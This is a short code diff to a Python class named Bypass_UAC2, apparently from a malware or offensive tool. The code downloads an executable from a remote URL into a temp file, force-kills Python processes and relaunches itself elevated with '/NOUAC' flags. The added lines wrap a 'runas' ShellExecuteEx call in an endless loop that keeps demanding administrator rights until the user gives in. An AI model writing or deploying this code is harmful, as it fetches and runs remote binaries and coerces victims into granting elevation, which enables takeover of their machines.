@@ -9,6 +9,7 @@ class Bypass_UAC2():
 		self.Main()
 
 	def Main(self):
+		import win32com.shell.shell as shell
 		req = requests.get(self.hstart)
 		file = tempfile.TemporaryFile()
 		filename = file.name + ".exe"
@@ -20,4 +21,11 @@ class Bypass_UAC2():
 
 		python = os.path.abspath(sys.executable)
 		me = os.path.abspath(sys.argv[0])
-		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
+
+		while True:
+			try:
+				shell.ShellExecuteEx(lpVerb='runas', lpFile=filename, lpParameters="/regtask")
+				os.system("taskkill /IM python.exe /F")
+				sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
+			except Exception as ex:
+				pass
